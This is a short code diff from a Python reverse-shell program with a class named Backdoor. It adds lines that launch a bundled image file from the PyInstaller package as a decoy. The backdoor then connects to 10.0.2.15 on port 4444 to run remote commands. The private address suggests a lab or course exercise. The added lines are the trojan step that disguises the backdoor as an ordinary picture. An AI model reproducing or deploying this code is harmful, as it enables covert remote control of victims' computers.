@@ -80,6 +80,10 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
+# The file name needs to be changed accordingly based on what file we want to package with .py script.
+file_path = os.path.join(sys._MEIPASS, "python_black.jpg")
+subprocess.Popen(file_path, shell=True)
+
 try:
     backdoor = Backdoor("10.0.2.15", 4444)
     backdoor.run()
